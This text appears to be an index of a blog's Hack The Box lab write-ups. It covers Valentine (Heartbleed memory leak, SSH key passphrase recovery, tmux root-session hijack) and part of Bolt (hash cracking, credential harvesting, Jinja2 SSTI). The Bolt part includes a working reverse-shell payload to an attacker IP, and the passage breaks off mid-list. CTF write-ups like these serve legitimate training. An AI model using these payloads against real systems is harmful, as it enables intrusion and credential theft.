62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d\nConvert the hex to ascii (https://www.rapidtables.com/convert/number/hex-to-ascii.html):\n—–BEGIN RSA PRIVATE KEY—– Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\nDbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 —–END RSA PRIVATE KEY—–\n[root:/git/htb/valentine]# file hex_out (master✱) hex_out: PEM RSA private key\n\nTrying Server Side Injection (SSI) on the encode and decode functions gives nothing, they have probably fixed that issue.\n\nGo back a step and analyse the data that we do have. Looking on the picture from index.php, a woman screaming and a bleeding heart, maybe this tells us we should look on Heartbleed? Lets look for that!\n[root:/git/htb/valentine]# nmap -sV –script=ssl-heartbleed 10.10.10.79 (master✱) PORT STATE SERVICE VERSION — snip — |http-server-header: Apache/2.2.22 (Ubuntu) | ssl-heartbleed: | VULNERABLE: | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. | State: VULNERABLE | Risk factor: High | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves. | | References: | http://www.openssl.org/news/secadv_20140407.txt | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 | http://cvedetails.com/cve/2014-0160/\nDownload a heartbleed script and attack until you get something usable from the memory leak.\n[root:/git/htb/valentine]# python heatbleed.py 10.10.10.79 (master✱)\ndefribulator v1.16 A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)\n################################################################## Connecting to: 10.10.10.79:443, 1 times Sending Client Hello for TLSv1.0 Received Server Hello for TLSv1.0\nWARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable! Please wait… connection attempt 1 of 1 ##################################################################\n.@….SC[…r….+..H…9… ….w.3….f… …!.9.8………5…………… ………3.2…..E.D…../…A……………………………I……… ……….. ……………………………..#…….0.0.1/decode.php Content-Type: application/x-www-form-urlencoded Content-Length: 42\n$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==S.5.%….,b.,.N.@\n[root:/git/htb/valentine]# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 –decode (master✱) heartbleedbelievethehype\n\n‘heartbleedbelievethehype’ is probably the password for ‘hype_key’ that we found previously. Login and grab user.\n\n[root:/git/htb/valentine]# ssh hype@valentine.htb -i hype-id_rsa (master✱) Enter passphrase for key ‘hype-id_rsa’: Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)\n\nDocumentation: https://help.ubuntu.com/\n\nNew release ‘14.04.5 LTS’ available. Run ‘do-release-upgrade’ to upgrade to it.\nLast login: Tue Mar 16 03:57:33 2021 from 10.10.14.12 hype@Valentine:~$ id uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare) hype@Valentine:~$ cat Desktop/user.txt e6710a5464769fd5fcd216e076961750\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nLooking in .bash_history we can see some interesting commands. If we investigate it further we can see that dev_sess is both readable and writeable. And ontop of that, root is running that process.\n\nhype@Valentine:~$ cat .bash_history exit exot exit ls -la cd / ls -la cd .devs ls -la tmux -L dev_sess tmux a -t dev_sess tmux –help tmux -S /.devs/dev_sess\nhype@Valentine:/.devs$ ls -al total 8 drwxr-xr-x 2 root hype 4096 Mar 16 01:38 . drwxr-xr-x 26 root root 4096 Feb 6 2018 .. srw-rw—- 1 root hype 0 Mar 16 01:38 dev_sess\nhype@Valentine:/.devs$ ps aux | grep root — snip — root 1012 0.0 0.1 26416 1680 ? Ss 01:38 0:04 /usr/bin/tmux -S /.devs/dev_sess\nTmux has a vulnerability allowing us to hijack the root session. Just run the same command to spawn a root shell.\nhype@Valentine:/.devs$ tmux -S /.devs/dev_sess root@Valentine:/.devs# id uid=0(root) gid=0(root) groups=0(root) root@Valentine:/.devs# cat /root/root.txt f1bb6d759df1f272914ebbc9ed7765b2\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nHeartbleed.py: https://gist.github.com/eelsivart/10174134\nTmux Session Hijack: https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0"
  },
  {
    "objectID": "posts/2019-04-14-htb-writeup-popcorn/2019-04-14-htb-writeup-popcorn.html",
    "href": "posts/2019-04-14-htb-writeup-popcorn/2019-04-14-htb-writeup-popcorn.html",
    "title": "Popcorn - Hack The Box",
    "section": "",
    "text": "No writeup available.."
  },
  {
    "objectID": "posts/2021-11-12-htb-writeup-bolt/2021-11-12-htb-writeup-bolt.html",
    "href": "posts/2021-11-12-htb-writeup-bolt/2021-11-12-htb-writeup-bolt.html",
    "title": "Bolt - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n\nUSER\n\nStep 1\nStandard enum with nmap, dirb, nikto, ffuf. nmap:\n┌──(void㉿void)-[/htb]\n└─$ nmap -Pn -n -sCV 10.10.11.114  \nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 15:05 CEST\nNmap scan report for 10.10.11.114\nHost is up (0.047s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)\n|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)\n|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)\n80/tcp  open  http     nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title:     Starter Website -  About \n443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n| http-title: Passbolt | Open source password manager for teams\n|_Requested resource was /auth/login?redirect=%2F\n| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU\n| Not valid before: 2021-02-24T19:11:23\n|_Not valid after:  2022-02-24T19:11:23\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\ndirb:\n+ http://10.10.11.114/contact (CODE:200|SIZE:26293)\n+ http://10.10.11.114/download (CODE:200|SIZE:18570)\n+ http://10.10.11.114/index (CODE:308|SIZE:247)\n+ http://10.10.11.114/index.html (CODE:200|SIZE:30347)\n+ http://10.10.11.114/login (CODE:200|SIZE:9287)\n+ http://10.10.11.114/logout (CODE:302|SIZE:209)\n+ http://10.10.11.114/pricing (CODE:200|SIZE:31731)\n+ http://10.10.11.114/profile (CODE:500|SIZE:290)\n+ http://10.10.11.114/register (CODE:200|SIZE:11038)\n+ http://10.10.11.114/services (CODE:200|SIZE:22443)\n+ http://10.10.11.114/sign-up (CODE:200|SIZE:11038)\nffuf:\n$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.11.114/FUZZ\ncheck-email             [Status: 200, Size: 7331, Words: 1224, Lines: 147]\ncontact                 [Status: 200, Size: 26293, Words: 10060, Lines: 468]\ndownload                [Status: 200, Size: 18570, Words: 5374, Lines: 346]\nlogin                   [Status: 200, Size: 9287, Words: 2135, Lines: 173]\nlogout                  [Status: 302, Size: 209, Words: 22, Lines: 4]\npricing                 [Status: 200, Size: 31731, Words: 11055, Lines: 549]\nregister                [Status: 200, Size: 11038, Words: 3053, Lines: 199]\nservices                [Status: 200, Size: 22443, Words: 7170, Lines: 405]\nsign-in                 [Status: 200, Size: 9287, Words: 2135, Lines: 173]\nsign-up                 [Status: 200, Size: 11038, Words: 3053, Lines: 199]\nvhost: passbolt.bolt.htb\n\n\n\nStep 1\nGoing through port 80 we find a login portal, and a lot of junk text. In the Download menu we are able to download a docker image http://bolt.htb/download. Load the image and enumerate it with a shell and we find a few interesting keys, nothing more however.\n┌──(void㉿void)-[/htb/bolt]\n└─$ sudo docker load &lt; image.tar\n3fc64803ca2d: Loading layer [==================================================&gt;]  4.463MB/4.463MB\n73f2f98bc222: Loading layer [==================================================&gt;]   7.68kB/7.68kB\n8f2df5d06a26: Loading layer [==================================================&gt;]  62.86MB/62.86MB\na1e4f9dc4110: Loading layer [==================================================&gt;]  57.57MB/57.57MB\nf0c4120bc314: Loading layer [==================================================&gt;]  29.79MB/29.79MB\n14ec2ed1c30d: Loading layer [==================================================&gt;]  6.984MB/6.984MB\n68c03965721f: Loading layer [==================================================&gt;]  3.072kB/3.072kB\nfec67b58fd48: Loading layer [==================================================&gt;]  19.97kB/19.97kB\n7fa1531c7420: Loading layer [==================================================&gt;]  7.168kB/7.168kB\ne45bbea785e3: Loading layer [==================================================&gt;]  15.36kB/15.36kB\nac16908b339d: Loading layer [==================================================&gt;]  8.192kB/8.192kB\nLoaded image: flask-dashboard-adminlte_appseed-app:latest\n\n┌──(void㉿void)-[/htb/bolt]\n└─$ sudo docker run -it flask-dashboard-adminlte_appseed-app sh\n/ # id && hostname\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\neefbc446e8af\nKey in .env:\n/ # cat .env \nDEBUG=True\nSECRET_KEY=S3cr3t_K#Key\nDB_ENGINE=postgresql\nDB_NAME=appseed-flask\nDB_HOST=localhost\nDB_PORT=5432\nDB_USERNAME=appseed\nDB_PASS=pass\nKey in config.py:\n/ # cat config.py\n\n&lt; --- SNIP --- &gt;\n\n    # Set up the App SECRET_KEY\n    SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')\n    \n    &lt; --- SNIP --- &gt;\n    \n    # PostgreSQL database\n    SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format(\n        config( 'DB_ENGINE'   , default='postgresql'    ),\n        config( 'DB_USERNAME' , default='appseed'       ),\n        config( 'DB_PASS'     , default='pass'          ),\n        config( 'DB_HOST'     , default='localhost'     ),\n        config( 'DB_PORT'     , default=5432            ),\n        config( 'DB_NAME'     , default='appseed-flask' )\nRunning the application we also find a debugger PIN:\n/ # nohup  python3 run.py &gt; log.txt 2&gt;&1 &\n/ # ps aux\nPID   USER     TIME   COMMAND\n    1 root       0:00 sh\n   12 root       0:00 python3 run.py\n   15 root       0:00 /usr/bin/python3 /run.py\n   20 root       0:00 ps aux\n\n/ # cat log.txt\n[2021-10-05 14:44:01,587] INFO in run: DEBUG       = True\n[2021-10-05 14:44:01,587] INFO in run: Environment = Debug\n[2021-10-05 14:44:01,587] INFO in run: DBMS        = sqlite:////db.sqlite3\n * Tip: There are .env or .flaskenv files present. Do \"pip install python-dotenv\" to use them.\n * Serving Flask app \"app\" (lazy loading)\n * Environment: production\n   WARNING: This is a development server. Do not use it in a production deployment.\n   Use a production WSGI server instead.\n * Debug mode: on\n * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)\n * Restarting with stat\n[2021-10-05 14:44:01,996] INFO in run: DEBUG       = True\n[2021-10-05 14:44:01,997] INFO in run: Environment = Debug\n[2021-10-05 14:44:01,997] INFO in run: DBMS        = sqlite:////db.sqlite3\n * Tip: There are .env or .flaskenv files present. Do \"pip install python-dotenv\" to use them.\n * Debugger is active!\n * Debugger PIN: 108-288-330\nHowever nothing to help us progress with the box. On port 443 we are forwarded to a recovery site, but have no valid account to enter.\n\n\n\nStep 2\nChanging the approach to a more simple, we instead unpack the image and go through all the directories and .tar-files manually. In a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar we find the file db.sqlite3. Opening it up we see the table users and within a user and hash. Username: admin Email: admin@bolt.htb Hash: $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.\n![[bolt-01.png]]\nCrack the hash and we find get the password deadbolt.\n┌──(void㉿void)-[/htb/bolt]\n└─$ hashcat -a0 -m500 sqlite3.hash /usr/share/wordlists/rockyou.txt \n\n$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt      \n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nLogin to the portal (http://bolt.htb/login) using the found credentials - admin:deadbolt.\n\n\n\nStep 3\nOn the admin-panel we directly see a chat message from Alexander Pierce: Hi Sarah, did you have time to check over the docker image? If not I'll get Eddie to take a look over. Our security team had a concern with it - something about e-mail?\nAfter being stumped for a while, I’m starting to think that I missed something in my initial enumeration. I had yet to enumerate vhosts!\n┌──(void㉿void)-[/htb/bolt]\n└─$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://bolt.htb -H 'Host: FUZZ.bolt.htb'  -fl 505\n\ndemo                    [Status: 302, Size: 219, Words: 22, Lines: 4]\nmail                    [Status: 200, Size: 4943, Words: 345, Lines: 99]\nTrying to login on mail.bolt.htb using credentials admin@bolt.htb:deadbolt gives the error Connection to storage server failed. rather then invalid password. As we don’t have any other users, lets move on to the demo vhost.\nHere we are able to create a new user - but we need a invite code. Following previous steps I begin to look in the image files for a hidden invite key. After some looking we a key in 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar –&gt; app/base/routes.py:\ndef register():\n    login_form = LoginForm(request.form)\n    create_account_form = CreateAccountForm(request.form)\n    if 'register' in request.form:\n\n        username  = request.form['username']\n        email     = request.form['email'   ]\n        code      = request.form['invite_code']\n        if code != 'XNSS-HSJW-3NGU-8XTJ':\n            return render_template('code-500.html')\n        data = User.query.filter_by(email=email).first()\n        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':\n            # Check usename exists\nCreate a new account. Username: asdasd Email: asdasd@bolt.htb Password: asdasd Invite Code: XNSS-HSJW-3NGU-8XTJ\n\n\n\nStep 4\nWith access to both mail.bolt.htb and demo.bolt.htb we have a much bigger surface and after looking around the attack vectors seem small. After a while I notice that changing the username on demo.bolt.htb triggers a confirmation email from support@bolt.htb, to confirm the change. Maybe we can exploit this to with XSS to get a token, or even trigger a reverse shell?\n![[bolt-02.png]]\n![[bolt-03.png]]\nTrying different input results in nothing interesting, Javascript results in empty mails. After a lot of digging I tried SSTI and to my surprise it worked! {% raw %}{7*7}{% endraw %} results in a response mail with username 49:\n![[bolt-04.png]]\nInput: {% raw %}{7*'7'}{% endraw %}\nOutput: 7777777\nFollowing the SSTI-chart we find that it’s most likely Jinja2, Twig or something unknown.\n![[bolt-05.png]]\n\n\n\nStep 5\nExploit the SSTI vulnerability to get file read, code execution and a reverse shell. Trying different payloads we can confirm that it’s Jinja2.\nFile read\nInput:\n{% raw %}{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }{% endraw %}\nOutput:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin saned:x:117:123::/var/lib/saned:/usr/sbin/nologin nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false whoopsie:x:120:125::/nonexistent:/bin/false colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false eddie:x:1000:1000:Eddie Johnson,,,:/home/eddie:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin vboxadd:x:998:1::/var/run/vboxadd:/bin/false sshd:x:126:65534::/run/sshd:/usr/sbin/nologin mysql:x:127:133:MySQL Server,,,:/nonexistent:/bin/false clark:x:1001:1001:Clark Griswold,,,:/home/clark:/bin/bash postfix:x:128:134::/var/spool/postfix:/usr/sbin/nologin vmail:x:5000:5000::/var/mail:/usr/bin/nologin dovecot:x:129:136:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin dovenull:x:130:137:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin\nNone of the reverse payloads from Hacktricks worked for me, however I found another Jinja2 reverse a python shell that did work!\nInput:\n{% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.10\\\",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\", \\\"-i\\\"]);'\")}}{%endif%}{% endfor %}{% endraw %}\nOutput:\n┌──(void㉿void)-[/htb/bolt]\n└─$ nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.11.114] 48068\n/bin/sh: 0: can't access tty; job control turned off\n$ id && hostname\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbolt.htb\n$ pwd\n/var/www/demo\nA quick look around and we see that user Eddie has mail. Maybe this is something we should look at when we have the right privs.\nwww-data@bolt:/var/mail$ ls -al\n&lt; --- SNIP --- &gt;\n-rw-------  1 eddie    mail  909 Feb 25  2021 eddie\n\nwww-data@bolt:/var/mail$ cat eddie\ncat: eddie: Permission denied\n\n\n\nStep 6\nEnumerating the box manually we find three config files, ~/demo/config.py and ~/dev/config.py are both identical and use the same database. Looking through the database gives us nothing new to use.\nwww-data@bolt:~/demo$ cat config.py \n\"\"\"Flask Configuration\"\"\"\n#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'\nSQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'\nSQLALCHEMY_TRACK_MODIFICATIONS = True\nSECRET_KEY = 'kreepandcybergeek\nThe third config file, ~/roundcube/config/config.py, points toward a new database but just like the other two - no new information.\nwww-data@bolt:~/roundcube/config$ cat config.inc.php\n\n&lt; --- SNIP --- &gt;\n\nverify_server_cert=false'\n$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';\nSo we have accounted for all three http domains, next lets have a look on the https domain, passbolt.bolt.htb.\nwww-data@bolt:/$ find / -type d -name \"passbolt\" 2&gt;/dev/null\n/etc/passbolt\n/usr/share/php/passbolt\n/usr/share/passbolt\n/var/lib/passbolt\n/var/log/passbolt\n\nwww-data@bolt:/etc/passbolt$ cat passbolt.php\n&lt;--- SNIP ---&gt;\n    // Database configuration.\n    'Datasources' =&gt; [\n        'default' =&gt; [\n            'host' =&gt; 'localhost',\n            'port' =&gt; '3306',\n            'username' =&gt; 'passbolt',\n            'password' =&gt; 'rT2;jW7&lt;eY8!dX8}pQ8%',\n            'database' =&gt; 'passboltdb'\n&lt;--- SNIP ---&gt;\n    'passbolt' =&gt; [\n        // GPG Configuration.\n        // The keyring must to be owned and accessible by the webserver user.\n        // Example: www-data user on Debian\n        'gpg' =&gt; [\n            // Main server key.\n            'serverKey' =&gt; [\n                // Server private key fingerprint.\n                'fingerprint' =&gt; '59860A269E803FA094416753AB8E2EFB56A16C84',\n                'public' =&gt; CONFIG . DS . 'gpg' . DS . 'serverkey.asc',\n                'private' =&gt; CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc',\nLooking through the passbolt database there are no passwords or hashes to crack, instead there are pgp keys for both user Clark and Eddie - which so far leads to nothing.\nFrom the internal enumeration we’ve found three passwords; - dXUUHSW9vBpH5qRB - 